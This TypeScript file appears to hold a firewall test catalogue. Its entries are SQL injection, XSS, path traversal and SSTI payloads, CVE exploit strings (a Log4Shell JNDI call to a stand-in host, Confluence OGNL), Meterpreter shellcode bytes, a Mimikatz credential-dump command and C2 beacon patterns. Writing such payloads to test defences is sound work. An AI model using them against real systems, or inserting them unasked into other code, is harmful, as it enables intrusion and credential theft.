
import { TestPayload, TestCategory } from './types';

export const TEST_PAYLOADS: TestPayload[] = [
  // --- WAF (Web Application Firewall) ---
  {
    id: 'waf-sqli-tautology',
    name: 'WAF: SQLi Tautology',
    description: 'Classic auth bypass using "OR 1=1". Tests basic SQL injection signatures.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "' OR 1=1 --",
    expectedBehavior: '403 Forbidden / 406 Not Acceptable'
  },
  {
    id: 'waf-sqli-union-all',
    name: 'WAF: UNION SELECT Leak',
    description: 'Attempts to join and leak data from the information_schema.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
    expectedBehavior: 'SQLi Schema Access Block'
  },
  {
    id: 'waf-sqli-blind-sleep',
    name: 'WAF: Blind SQLi (Sleep)',
    description: 'Time-based blind SQL injection using conditional sleep functions.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    expectedBehavior: 'Time-based Injection Filter'
  },
  {
    id: 'waf-xss-svg-event',
    name: 'WAF: SVG Event XSS',
    description: 'XSS attempt via SVG onload event to bypass basic HTML tag filters.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "<svg/onload=alert('SENTINELA')>",
    expectedBehavior: 'XSS/SVG Filter Match'
  },
  {
    id: 'waf-xss-polyglot-min',
    name: 'WAF: XSS Polyglot',
    description: 'A compact polyglot payload that executes in multiple HTML contexts.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(alert(1))//'>",
    expectedBehavior: 'Advanced XSS Filter Block'
  },
  {
    id: 'waf-lfi-passwd',
    name: 'WAF: LFI /etc/passwd',
    description: 'Local File Inclusion attempt targeting sensitive Linux system files.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "../../../../etc/passwd",
    expectedBehavior: 'Path Traversal Block'
  },
  {
    id: 'waf-ssti-handlebars',
    name: 'WAF: Handlebars SSTI',
    description: 'Template injection for code execution on Handlebars-based backends.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "{{#with 'test' as |t|}}{{#with (t.split 'a') as |s|}}{{s.constructor.constructor('alert(1)')()}}{{/with}}{{/with}}",
    expectedBehavior: 'SSTI Detection'
  },
  {
    id: 'waf-graphql-dos',
    name: 'WAF: GraphQL Introspection',
    description: 'Attempts to map the entire GraphQL schema via introspection query.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "query { __schema { types { name fields { name } } } }",
    expectedBehavior: 'GraphQL Policy Block'
  },

  // --- IPS (Intrusion Prevention) ---
  {
    id: 'ips-log4shell-jndi',
    name: 'IPS: Log4Shell (CVE-2021-44228)',
    description: 'Critical RCE signature using JNDI lookup patterns.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "${jndi:ldap://sentinela-audit.com/a}",
    expectedBehavior: 'IPS/Log4j Signature Match'
  },
  {
    id: 'ips-spring4shell',
    name: 'IPS: Spring4Shell (CVE-2022-22965)',
    description: 'ClassLoader manipulation pattern for Spring Framework RCE.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25",
    expectedBehavior: 'Critical RCE Block'
  },
  {
    id: 'ips-fortigate-rce',
    name: 'IPS: FortiGate RCE (CVE-2023-27997)',
    description: 'Detection of exploit patterns targeting FortiOS SSL-VPN vulnerabilities.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "POST /remote/logincheck HTTP/1.1\r\nEncrypted-Payload: ...",
    expectedBehavior: 'CVE Specific Signature'
  },
  {
    id: 'ips-f5-icontrol',
    name: 'IPS: F5 iControl REST RCE',
    description: 'Detection of exploit patterns for CVE-2022-1388.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "X-F5-Auth-Token: a, Connection: X-F5-Auth-Token",
    expectedBehavior: 'F5 Exploit Block'
  },
  {
    id: 'ips-confluence-ognl',
    name: 'IPS: Confluence OGNL Injection',
    description: 'Targeting CVE-2022-26134 for remote code execution on Atlassian systems.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "/%24%7B%28%23a%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Test%22%2C%22pwned%22%29%29%7D/",
    expectedBehavior: 'OGNL RCE Match'
  },

  // --- MALWARE & VIRUS (Gateway AV) ---
  {
    id: 'av-eicar-std',
    name: 'Malware: EICAR Standard',
    description: 'Industry standard non-viral test string. Basic signature detection.',
    category: TestCategory.VIRUS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    expectedBehavior: 'Gateway AV Interception'
  },
  {
    id: 'av-sliver-c2-beacon',
    name: 'Malware: Sliver C2 Beacon',
    description: 'Identification of Sliver C2 framework HTTP/2 heartbeat pattern.',
    category: TestCategory.MALWARE,
    type: 'network',
    targetDevice: 'NGFW',
    content: "GET /php_session_id.php HTTP/1.1\r\nCookie: session=... (Sliver Pattern)",
    expectedBehavior: 'C2 Traffic Match'
  },
  {
    id: 'av-cobalt-stager',
    name: 'Malware: Cobalt Strike Stager',
    description: 'Detection of the specific checksum-calculated URI for Cobalt Strike stagers.',
    category: TestCategory.MALWARE,
    type: 'network',
    targetDevice: 'NGFW',
    content: "GET /ab2g HTTP/1.1\r\nHost: c2-sentinela.xyz",
    expectedBehavior: 'Beacon Stager Block'
  },
  {
    id: 'av-meterpreter-shellcode',
    name: 'Malware: Meterpreter Reverse Shell',
    description: 'Detection of raw x64 reverse TCP shellcode in the request body.',
    category: TestCategory.MALWARE,
    type: 'network',
    targetDevice: 'NGFW',
    content: "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2",
    expectedBehavior: 'Shellcode Signature Block'
  },
  {
    id: 'av-ransom-locky-dga',
    name: 'Ransomware: Locky DGA Mimic',
    description: 'Simulates the algorithmic domain requests used by Locky ransomware.',
    category: TestCategory.RANSOMWARE,
    type: 'network',
    targetDevice: 'NGFW',
    content: "GET /index.php?id=928374829374928374 HTTP/1.1",
    expectedBehavior: 'DGA Domain Block'
  },
  {
    id: 'av-mimikatz-sekurlsa',
    name: 'Malware: Mimikatz Memory Dump',
    description: 'Signature for Mimikatz "sekurlsa::minidump" commands.',
    category: TestCategory.MALWARE,
    type: 'network',
    targetDevice: 'NGFW',
    content: "sekurlsa::logonpasswords lsass.exe",
    expectedBehavior: 'Post-Exploit Tool Block'
  },

  // --- BOT & AUTOMATION ---
  {
    id: 'bot-headless-fingerprint',
    name: 'Bot: Headless Chrome Scanner',
    description: 'Identifies Headless Chrome user-agents used by automated scrapers.',
    category: TestCategory.BOT,
    type: 'network',
    targetDevice: 'NGFW',
    content: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/114.0.0.0 Safari/537.36",
    expectedBehavior: 'Bot Management Challenge'
  },
  {
    id: 'bot-sqlmap-scan',
    name: 'Bot: sqlmap Signature',
    description: 'Identifying the default behavior of the sqlmap vulnerability scanner.',
    category: TestCategory.BOT,
    type: 'network',
    targetDevice: 'NGFW',
    content: "User-Agent: sqlmap/1.7.5#stable (https://sqlmap.org)",
    expectedBehavior: 'Security Tool Block'
  },
  {
    id: 'bot-burp-collaborator',
    name: 'Bot: Burp OOB Interaction',
    description: 'Attempts to reach out to Burp Collaborator domains for verification.',
    category: TestCategory.BOT,
    type: 'network',
    targetDevice: 'NGFW',
    content: "http://q3v9...burpcollaborator.net",
    expectedBehavior: 'OOB Domain Block'
  },
  {
    id: 'bot-cred-stuffing',
    name: 'Bot: Credential Stuffing',
    description: 'Simulates high-velocity automated login attempts.',
    category: TestCategory.BOT,
    type: 'network',
    targetDevice: 'NGFW',
    content: "POST /api/v1/login { \"user\": \"admin\", \"pass\": \"123456\" }",
    expectedBehavior: 'Rate Limit / Bot Challenge'
  },

  // --- EVASION & EXFIL ---
  {
    id: 'evasion-double-url',
    name: 'Evasion: Double URL Encoding',
    description: 'Testing if the security stack decodes multiple layers of encoding.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    expectedBehavior: 'Recursive Decoding Block'
  },
  {
    id: 'evasion-null-poison',
    name: 'Evasion: Null Byte Poisoning',
    description: 'Using %00 to truncate strings in path/file checks.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "malicious.php%00.jpg",
    expectedBehavior: 'Normalization Filter Match'
  },
  {
    id: 'dlp-cc-visa',
    name: 'DLP: Credit Card Leak',
    description: 'Exfiltrating multiple Visa card numbers to test DLP identifiers.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: "Records: 4539 0101 0202 0303, 4539 1234 5678 9012",
    expectedBehavior: 'DLP PII Block'
  },
  {
    id: 'dlp-aws-secret',
    name: 'DLP: AWS Secret Key Leak',
    description: 'Detects the exfiltration of AWS Secret Access Keys in plain text.',
    category: TestCategory.EXFIL,
    type: 'network',
    targetDevice: 'NGFW',
    content: "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    expectedBehavior: 'Credential Leak Detection'
  }
];
